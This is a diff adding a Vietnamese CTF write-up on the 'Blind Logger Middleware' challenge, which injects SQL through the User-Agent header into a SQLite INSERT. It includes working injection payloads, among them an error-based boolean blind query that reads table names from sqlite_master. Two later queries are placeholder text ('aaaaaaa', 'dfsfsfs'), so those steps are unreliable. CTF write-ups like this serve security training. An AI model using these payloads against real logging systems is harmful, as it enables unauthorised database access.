@@ -130,3 +130,60 @@
 
 
 # 3. Blind Logger Middleware
+
+## Đầu bài cho biết:
+```sql
+INSERT INTO logger (ip_address, user_agent, referer, url, cookie, created_at)
+VALUES ('{ip_address}', '{user_agent}', '{referer}', '{url}', '{cookie}', '{created_at}');
+```
+- Có một hàm được triển khai để "làm sạch" (sanitize) đầu vào của người dùng, loại bỏ các ký tự đặc biệt trước khi chèn chúng vào truy vấn SQL
+- SQLite
+
+## Giải
+- Trong câu lệnh INSERT kia có các thành phần là `ip_address`, `user_agent`, `referer`, `url`, `cookie`, `created_at`. Để ý đến `user_agent` có trong request gửi đi, nên em nghĩ mình có thể attack từ đây.
+- Sửa `User-Agent` thành: `', null, null, null, null),(null,'`
+- Khi đó truy vấn gửi đi sẽ là:
+``` sql
+INSERT INTO logger (ip_address, user_agent, referer, url, cookie, created_at)
+VALUES ('{ip_address}', '{user_agent}', null, null, null, null), (null,'', '{referer}', '{url}', '{cookie}', '{created_at}');
+```
+- Như vậy nó sẽ thành gửi đi 2 bộ giá trị.
+
+![image](https://github.com/user-attachments/assets/39f96a09-d136-47c1-adc1-6b3db8efa3d6)
+
+- Thử giá trị NULL kia, thì nó ở dạng số hoặc string.
+- Từ đây em muốn sử dụng Boolean để đoán ra từng ký tự có trong flag.
+- Đầu tiên, tìm kiếm tên bảng với truy vấn này và [script này](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/ckArenapy/Blind_Logger_Middleware_tables.py)
+
+`', (SELECT CASE WHEN substr((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0), 1, 1) = 'a' THEN 1 ELSE abs(-9223372036854775808) END), null, null, null),(null,'`
+
+![image](https://github.com/user-attachments/assets/e728ddf4-b962-4673-8e14-1585ba36baf4)
+
+- Có 2 bảng là `logger` và `flag`
+- Khai thác bảng `flag` với truy vấn và script này
+
+`aaaaaaa`
+
+![image](https://github.com/user-attachments/assets/4214545f-1e10-4b4f-b677-d8196c50a05e)
+
+- Vậy là có 2 cột là: `id` và `secret`
+
+- Tiếp tục khai thác cột `secret` để tìm flag có trong cột bằng truy vấn và script này
+
+`dfsfsfs`
+
+![image](https://github.com/user-attachments/assets/08051c0e-6683-4ebe-8e9b-f168a8a32fa7)
+
+- Lấy được flag: `CHH{blInD_sqLi_1N_UPDATE}`
+
+
+
+
+
+
+
+
+
+
+
+
